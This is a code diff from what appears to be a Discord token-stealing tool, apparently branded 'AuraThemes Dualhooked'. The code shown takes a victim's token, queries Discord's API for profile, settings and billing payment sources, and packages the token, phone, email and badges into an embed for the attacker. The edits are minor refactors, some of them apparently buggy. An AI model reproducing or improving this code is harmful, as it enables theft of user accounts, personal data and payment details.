@@ -160,6 +160,10 @@ function getNitro(u) {
   }
 }
 
+function getDate(a, b) {
+  return new Date(a).setMonth(a.getMonth() + b);
+}
+
 function getImage(p) {
   if (!p) return false;
   return `${p}.${fetch(p).headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;
@@ -189,7 +193,7 @@ function allBabges(f) {
   ) || ":x:";
 }
 
-async function embedGrabber(info, data) {
+function embedGrabber(info, data) {
   const profile = getAPI(`https://discord.com/api/v9/users/${info.id}/profile`, info.token);
   const settings = getAPI(`https://discord.com/api/v9/users/@me/settings`, info.token);
   const payment = getAPI(`https://discord.com/api/v9/users/@me/billing/payment-sources`, info.token);
@@ -204,7 +208,7 @@ async function embedGrabber(info, data) {
 
   const avatar = info.avatar ? getImage(`https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`) : 'https://i.imgur.com/WkKXZSl.gif';
 
-  console.log({...profile, ...settings, ...payment})
+  console.log({ ...profile, ...settings, ...payment })
 
   return new EmbedBuilder()
     .setAuthor({ name: `${info.username}#${info.discriminator} | ${info.id}`, iconURL: avatar })
@@ -213,7 +217,7 @@ async function embedGrabber(info, data) {
     .setTitle('AuraThemes Dualhooked')
     .addFields(
       { name: "<a:aura:1087044506542674091> Token", value: `\`\`\`${data}\`\`\``, inline: false },
-      { name: "Nitro", value: await getNitro(profile), inline: true },
+      { name: "Nitro", value: getNitro(profile), inline: true },
       { name: "Badges", value: allBabges(info.flags), inline: true },
       { name: "Phone", value: `\`${info.phone || "None"}\``, inline: true },
       { name: "Email", value: `\`${info.email || "None"}\``, inline: false },
